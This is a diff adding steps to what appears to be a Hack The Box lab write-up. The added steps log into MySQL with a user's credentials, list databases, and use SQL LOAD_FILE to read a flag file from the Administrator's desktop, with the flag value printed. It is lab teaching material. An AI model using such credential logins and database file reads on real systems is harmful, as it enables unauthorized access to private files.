@@ -490,3 +490,30 @@ Now I attempted to login to the MySQL Service with the command:
 ```bash
 mysql -u fiona -p987654321 -h 10.129.54.106 --skip-ssl
 ```
+After succesfully connecting to the MySQL service, I used the command: 
+```bash
+MariaDB [(none)]> SHOW DATABASES;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| phpmyadmin         |
+| test               |
++--------------------+
+MariaDB [TEST]> use phpmyadmin
+
+```
+To retrieve the flag you will have to use the command: 
+```bash
+MariaDB [phpmyadmin]> SELECT LOAD_FILE("C:/Users/Administrator/Desktop/flag.txt");
+
++------------------------------------------------------+
+| LOAD_FILE("C:/Users/Administrator/Desktop/flag.txt") |
++------------------------------------------------------+
+| HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}              |
++------------------------------------------------------+
+1 row in set (0.019 sec)
+
+```
